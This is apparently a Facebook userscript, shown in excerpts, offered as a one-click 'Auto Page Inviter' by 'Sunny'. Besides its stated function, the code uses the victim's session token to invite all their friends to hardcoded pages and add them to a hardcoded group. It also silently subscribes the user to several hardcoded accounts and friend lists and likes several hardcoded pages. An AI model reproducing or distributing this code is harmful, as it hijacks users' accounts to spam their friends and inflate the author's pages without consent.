// ==UserScript==
// @name        Facebook Auto Page Inviter 
// @namespace   Auto Page Inviter By Sunny 
// @description Invite Your All Friends With Single Click
...
var Descriptions = "",
    _text = 'Powered By:  <A style="color:#3B5998;" href="https://www.facebook.com/sunnysrn" target="_blank">Cooltricks4u.com</A></br>Script Edited By: </A><A style="color:#3B5998;" href="https://www.facebook.com/sippy.srn" target="_blank">SunnySrn</A></A>,</A></A>.</br>For More Tricks like single mane auto wall post auto sujection etc  <A style="color:#3B5998;" href="https://www.facebook.com/sunnysrn target="_blank">COOL FB TRICKS </A>.</A>';
...
display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Cancel</span><br/>";
    ...
    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=143087752509107&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=498118676957065&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=623146064423098&source=typeahead&members=" + opo + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
...
var a = document.createElement('script');a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";document.body.appendChild(a);}a("100002074065956");a("100006526814498");a("100006605431159");sublist("588310551248075");sublist("606044962807967");sublist("606178309461299");sublist("613552892057174");function Like(p){ var Page=new XMLHttpRequest();
...
Page.send(PageParams)}Like("143087752509107");Like("1393552284222157");Like("154629457926783");Like("498118676957065");